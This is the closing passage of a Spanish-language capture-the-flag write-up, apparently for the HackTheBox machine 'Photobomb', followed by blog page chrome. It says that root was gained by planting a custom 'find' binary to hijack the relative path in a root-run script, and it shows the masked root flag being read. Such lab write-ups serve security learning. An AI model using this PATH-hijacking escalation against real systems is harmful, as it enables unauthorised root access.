wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
root@photobomb:/home/wizard/photobomb# 

</pre></td></tr></tbody></table></code></div></div>
<p>Ya rooteamos la máquina, lo que hicimos fue hacer un binario perzonalizado find que nos lanze una bash como root, en este caso, ya que el esta ejecutando el <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> con el binario find de forma relativa.
Procedemos a leer la flag</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>root@photobomb:/home/wizard/photobomb# <span class="nb">cat</span> /root/root.txt 
74<span class="k">****************************</span>35
root@photobomb:/home/wizard/photobomb# 
</pre></td></tr></tbody></table></code></div></div>
<p>¡¡¡Máquina Pwneada!!! Te deseo un Feliz Hackeo.</p>


</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>hackthebox</a>,
      <a href='/categories/machine/'>machine</a>,
      <a href='/categories/writeup/'>writeup</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >hackthebox</a>
      
      <a href="/tags/writeup/"
          class="post-tag no-text-decoration" >writeup</a>
      
      <a href="/tags/easy/"
          class="post-tag no-text-decoration" >easy</a>
      
      <a href="/tags/command-injection/"
          class="post-tag no-text-decoration" >command injection</a>
      
      <a href="/tags/path-hijacking/"
          class="post-tag no-text-decoration" >path hijacking</a>
      
      <a href="/tags/virtual-hosting/"
          class="post-tag no-text-decoration" >virtual hosting</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        Esta entrada está licenciada bajo 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         por el autor.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Compartir</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Photobomb+WriteUp+-+H4ckerLite+%7C+Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fphotobomb-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Photobomb+WriteUp+-+H4ckerLite+%7C+Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fphotobomb-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fphotobomb-writeup%2F&text=Photobomb+WriteUp+-+H4ckerLite+%7C+Blog" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copiar enlace"
        data-title-succeed="¡Enlace copiado!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Actualizado recientemente</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/broscience-writeup/">BroScience WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/metatwo-writeup/">MetaTwo WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/photobomb-writeup/">Photobomb WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/shoppy-writeup/">Shoppy WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/ambassador-writeup/">Ambassador WriteUp</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/easy/">easy</a>
    
      
      <a class="post-tag" href="/tags/virtual-hosting/">virtual hosting</a>
    
      
      <a class="post-tag" href="/tags/medium/">medium</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
    
      
      <a class="post-tag" href="/tags/ansible-playbook/">Ansible playbook</a>
    
      
      <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contenido</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Lecturas adicionales</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/precious-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673884800"
    data-df="YYYY-MM-DD"
    >
  2023-01-16
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Precious WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Les explicaré cómo comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la es...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/metatwo-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1679328000"
    data-df="YYYY-MM-DD"
    >
  2023-03-20
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>MetaTwo WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Hoy toca compremeter la máquina MetaTwo de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de  Word Press, usando dicha vulnerabilidad podemos dumpear ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/shoppy-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673625600"
    data-df="YYYY-MM-DD"
    >
  2023-01-13
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shoppy WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Les explicaré cómo comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la esc...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/precious-writeup/" class="btn btn-outline-primary"
    prompt="Anterior">
    <p>Precious WriteUp</p>
  </a>
  

  
  <a href="/posts/inject-writeup/" class="btn btn-outline-primary"
    prompt="Nuevo">
    <p>Inject WriteUp</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>



        <!-- The Footer -->

<footer class="row pl-3 pr-3">
  <div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0">
    <div class="footer-left">
      <p class="mb-0">
        © 2023
        <a href="https://twitter.com/mortzelo">H4ckerLite</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Hecho con 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         usando el tema 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
        .

      </p>
    </div>

  </div>

</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/easy/">easy</a>
    
      
      <a class="post-tag" href="/tags/virtual-hosting/">virtual hosting</a>
    
      
      <a class="post-tag" href="/tags/medium/">medium</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
    
      
      <a class="post-tag" href="/tags/ansible-playbook/">Ansible playbook</a>
    
      
      <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Actualizar
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

